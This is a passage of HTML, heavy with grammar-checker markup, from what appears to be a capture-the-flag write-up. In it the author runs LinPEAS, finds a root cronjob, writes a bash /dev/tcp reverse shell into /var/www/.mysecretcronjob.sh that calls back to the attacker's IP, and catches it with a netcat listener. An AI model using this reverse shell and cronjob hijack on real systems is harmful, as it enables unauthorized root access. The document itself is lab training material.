+        data-uid="pwa_55D1C-7EBF0-2B187-1BA83-70"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="97b5f3b0-8324-4b45-bf6b-0fd8c16ed1a2"
+          data-pwa-hint="Unknown word: LinPEAS"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="Lips~Lines~Links~Leans~Leaps"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3334px; left: 136.208px; width: 67.4479px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>Now I can run LinPEAS from the current directory.</p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_9DA8C-088AB-3B2F5-DCC34-92"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="8e1a8ebd-d954-423e-9475-09cc18371bd5"
+          data-pwa-hint="Possible confused word"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="CRFSR_SH_23"
+          data-pwa-help-id="CRFSR_SH_23"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="eh"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 94.5208px; width: 21.3021px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>./linpeas.sh</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_A74BE-0E1E6-70CB9-770DF-8B"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 529.594px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 529.594px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e653e6b0-d521-11ef-a7f2-17531d96907d">
+      <img src="e653e6b0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 42 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_0AACE-73398-6E8A3-8114D-FC"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+        ><pwa
+          data-pwa-id="533014cf-6f17-4e1e-a1ae-6e7010248533"
+          data-pwa-hint="Unknown word: LinPEAS"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="Lips~Lines~Links~Leans~Leaps"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3334px; left: 46.1042px; width: 67.4375px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      The LinPEAS color legend provides an explanation. The red/yellow and red
+      are key areas to look into for potential PE (privilege escalation)
+      vulnerabilities.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_654D7-BE8A5-07B18-9E1A2-73"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 161.698px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 161.698px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e654aa00-d521-11ef-a7f2-17531d96907d">
+      <img src="e654aa00-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 43 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_C7B01-E0017-1242D-439E8-05"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+        ><pwa
+          data-pwa-id="dc00c887-7093-4cbe-a8e3-2ab7a34caf6d"
+          data-pwa-hint="Unknown word: LinPEAS"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="Lips~Lines~Links~Leans~Leaps"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 8.66669px; width: 67.4375px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="3e5160b2-548f-437a-b478-bff9358e6f81"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob~carnauba"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 186.875px; width: 68.625px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      LinPEAS identifies a cronjob (scheduled task) that runs as the root user
+      in the /var/www directory. I cat it out to see the content of it.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_5C899-3649B-167CB-9FE32-B7"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 160.958px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 160.958px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e6556d50-d521-11ef-a7f2-17531d96907d">
+      <img src="e6556d50-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 44 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_1D0F5-DA830-B69BA-AAC0E-12"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 171.771px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 171.771px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e6567ec0-d521-11ef-a7f2-17531d96907d">
+      <img src="e6567ec0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 45 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_F440D-36D78-C918B-7E044-07"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 112px; z-index: 1;"
+        ><pwa
+          data-pwa-id="707794fd-5360-4e94-a8ec-59020fd65f7d"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob~carnauba"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 50px; width: 68.625px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="02143321-009e-4c08-b89d-a9678656b98d"
+          data-pwa-hint="Rewrite to avoid clutter words"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SSG_CLUTTER_WORDS_524"
+          data-pwa-help-id="SSG_CLUTTER_WORDS_524"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="styleguide"
+          data-pwa-suggestions="exploit"
+          data-pwa-help-article-id="1008206"
+          data-pwa-style-category="styleguide"
+          class="pwa-mark"
+          style="position: absolute; top: 47.3333px; left: 115.406px; width: 191.74px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="d9a8753a-5de5-4051-91f5-6dbdb07a58ed"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 47.3333px; left: 350.552px; width: 68.6354px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="5948943a-1714-4843-b7a4-0d75e390392e"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob~carnauba"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 75.3333px; left: 434.865px; width: 68.625px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 112px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      This cronjob contains no commands. However, it hints at using a bash
+      script. I will go ahead and exploit this cronjob by setting up a reverse
+      shell that will connect back to my Kali machine. The cronjob is already
+      set to run every minute, as denoted by the * * * * * time scheduling.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_824AF-303D7-0E10C-7B7B6-CB"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+        ><pwa
+          data-pwa-id="952e2b4c-5d78-4a74-a4bd-0ef074d1d58c"
+          data-pwa-hint="Unknown word: Pentestmonkey"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="Pentstemon"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 8.66669px; width: 138.365px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="3e72a836-a5cb-4701-b134-bc09b72def83"
+          data-pwa-hint="Unknown word: pentesting"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="pen testing"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 378.438px; width: 96.8854px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      Pentestmonkey is a website with various pentesting cheat sheets, including
+      reverse shells. For reverse shell setup, it provides a simple bash script.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_A71B5-ECAB3-26642-161E0-84"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      <a
+        href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+        >https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a
+      >
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_AF30B-CC88C-1E946-412E3-8F"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 207.188px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 207.188px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e6580560-d521-11ef-a7f2-17531d96907d">
+      <img src="e6580560-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 46 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_D3DB4-E2E56-F0793-6EFBD-E2"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+        ><pwa
+          data-pwa-id="b4de3b3c-694d-424b-8f96-cd7a8a101d68"
+          data-pwa-hint="Rewrite to avoid clutter words"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SSG_CLUTTER_WORDS_524"
+          data-pwa-help-id="SSG_CLUTTER_WORDS_524"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="styleguide"
+          data-pwa-suggestions="edit"
+          data-pwa-help-article-id="1008206"
+          data-pwa-style-category="styleguide"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 64.8021px; width: 166.313px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="d9cc9976-f4c8-42dd-b9b6-eedc13cffa15"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob~carnauba"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 270.635px; width: 68.625px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      I then go ahead and edit the cronjob file by replacing 10.0.0.1 in the
+      bash script with my virtual IP address, 10.2.14.66.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_9DB4B-BF1A8-4FABD-E93FA-FD"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          data-pwa-id="e126f779-9cfc-43fa-b3a0-dccd59728af7"
+          data-pwa-hint="Possible confused word"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="CRFSR_SH_23"
+          data-pwa-help-id="CRFSR_SH_23"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions="eh"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3335px; left: 324.333px; width: 21.3021px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>nano /var/www/.mysecretcronjob.sh</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_0DFB0-CCCDC-30528-C5D5A-1D"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>bash -i &gt;&amp; /dev/tcp/10.2.14.66/8080 0&gt;&amp;1</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_4BFB3-3DBEA-0EFA7-C4651-39"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 173.417px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 173.417px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65964f0-d521-11ef-a7f2-17531d96907d">
+      <img src="e65964f0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 47 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_91954-C1D5A-47707-64D6F-A7"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+        ><pwa
+          data-pwa-id="0a33f7dd-c14e-48aa-8ca0-637f38ed1f66"
+          data-pwa-hint="Unknown word: netcat"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="notecard"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3333px; left: 170.354px; width: 58.6146px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 56px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      Then, I initialize a netcat listener on my Kali machine to listen on port
+      8080 and catch the shell.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_6A99E-07B2B-7A3AF-E16EF-E2"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 28px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p><b>nc -lvnp 8080</b></p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_70492-97C90-41E4B-6572C-86"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 136.302px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 136.302px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65a7660-d521-11ef-a7f2-17531d96907d">
+      <img src="e65a7660-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 48 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_4D3E1-81E57-FD87D-AA9AF-96"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+        ><pwa
+          data-pwa-id="db7c7014-5bff-4e0b-8e71-e3826bea24fd"
+          data-pwa-hint="Unknown word: cronjob"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="corncob~carnauba"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3335px; left: 181.833px; width: 68.625px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="8bd775da-51dd-4730-a9a2-db2ab806aa8e"
+          data-pwa-hint="Missing comma before independent clause"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="COMMA_CC_DP"
+          data-pwa-help-id="COMMA_CC_DP"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammargrammar"
+          data-pwa-suggestions=", and"
+          data-pwa-help-article-id="1008093"
+          data-pwa-style-color="3"
+          class="pwa-mark"
+          style="position: absolute; top: 19.3335px; left: 467.094px; width: 40.25px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="89be2656-6756-48da-b8f2-5b3019fbbe35"
+          data-pwa-hint="Unknown word: whoami"
+          data-pwa-heavy="false"
+          data-pwa-rule-id="SIMPLE_SPELLING"
+          data-pwa-help-id="SIMPLE_SPELLING"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="grammarspelling"
+          data-pwa-suggestions="who ami"
+          data-pwa-help-article-id="1000042"
+          data-pwa-style-color="1"
+          class="pwa-mark"
+          style="position: absolute; top: 47.3335px; left: 325.521px; width: 72.3541px; height: 22px;"
+        ></pwa
+        ><pwa
+          data-pwa-id="9f3f8126-ce97-45e7-8cc8-d5b8711bc479"
+          data-pwa-hint='Remove the word "that" to make your writing shorter and clearer.'
+          data-pwa-heavy="false"
+          data-pwa-rule-id="READABILITY_2834"
+          data-pwa-help-id="READABILITY_2834"
+          data-pwa-report="realtime_light_long"
+          data-pwa-category="morereadable"
+          data-pwa-suggestions="I confirm I am"
+          data-pwa-help-article-id="1000043"
+          data-pwa-style-color="5"
+          class="pwa-mark"
+          style="position: absolute; top: 47.3335px; left: 407.625px; width: 167.208px; height: 22px;"
+        ></pwa
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 4px 0px; padding: 16px 48px 16px 8px; width: 687.667px; height: 84px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <p>
+      After a minute, the cronjob automatically executes and I catch it on my
+      listening port. Using the command&nbsp;<b>whoami</b>, I confirm that I am
+      indeed now the target root user on my Kali terminal.
+    </p>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_469AE-0DE60-37ADB-73EEF-99"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 163.875px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 163.875px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65b60c0-d521-11ef-a7f2-17531d96907d">
+      <img src="e65b60c0-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 49 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
+      ><pwa-container
+        data-uid="pwa_4FD2C-D59D2-9CFEF-C11DB-A1"
+        class="pwa-container "
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 194.708px; z-index: 1;"
+        ><pwa
+          style="position: absolute; top: 99999px; left: 999999px; width: 1px; height: 1px;"
+        ></pwa></pwa-container
+      ><pwa-container
+        style="overflow: hidden; position: absolute; box-sizing: content-box; pointer-events: none; margin: 6px 0px; padding: 4px 8px; width: 727.667px; height: 194.708px; z-index: 1;"
+      ></pwa-container
+    ></pwa-container-wrapper>
+    <figure id="e65bfd00-d521-11ef-a7f2-17531d96907d">
+      <img src="e65bfd00-d521-11ef-a7f2-17531d96907d.png" />
+      <figcaption>Figure 50 -</figcaption>
+    </figure>
+    <pwa-container-wrapper
+      style="display: flex !important; height: 0px !important;"
